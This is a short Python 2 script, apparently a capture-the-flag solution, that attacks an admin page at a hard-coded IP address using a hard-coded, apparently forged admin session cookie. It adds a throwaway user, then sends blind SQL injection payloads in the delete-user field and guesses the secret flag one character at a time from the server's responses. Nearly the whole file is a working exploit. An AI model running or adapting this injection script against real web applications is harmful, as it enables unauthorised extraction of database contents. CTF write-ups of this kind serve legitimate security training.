'''https://mp.weixin.qq.com/s/BMsWmiy9Hs0BRqr9EibThQ
'''
import requests
import string

url = 'http://172.93.39.218:8888/admin'
session = 'eyJuYW1lIjoiYWRtaW4ifQ.XCLtGg._ppwjv73cQjEumVInephn2qKcps'
cookies = {'session': session}

def adduser():
  data = {'username': '111', 'password': '111'}
  try:
    requests.post(url=url, cookies=cookies, data=data)
  except StandardError as e:
    print e
    exit(-1)

def deluser(idx):
  for c in string.letters+string.digits+'{}':
    payload = "111' and substr((select flag from flag),%d,1)=='%s" % (idx, c)
    print payload
    data = {'usernamedel': payload}
    try:
      r = requests.post(url=url, cookies=cookies, data=data)
      if '111' not in r.text:
        return c
    except StandardError as e:
      print e
      exit(-1)
  exit(-1)

flag = ''
if __name__ == '__main__':
  for i in range(50):
    adduser()
    flag += deluser(i+1)
    print flag
